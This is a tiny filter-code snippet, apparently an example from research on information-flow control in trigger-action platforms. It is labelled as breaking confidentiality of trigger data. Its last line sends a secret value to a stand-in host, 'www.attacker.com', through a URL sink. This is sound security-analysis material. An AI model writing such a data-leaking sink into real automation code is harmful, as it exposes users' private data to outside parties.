// Filter code in Example 7.2
// Maker: ---
// Link : ---

// Trigger: ---
// Action: ---

// Policy/Presence: Confidentiality of trigger data / No

h = lbl(true);
if (h) {
	skip('Sink');
}
else {
	skip('Sink');
}
sink('Sink', '', urll("www.attacker.com?" + h));
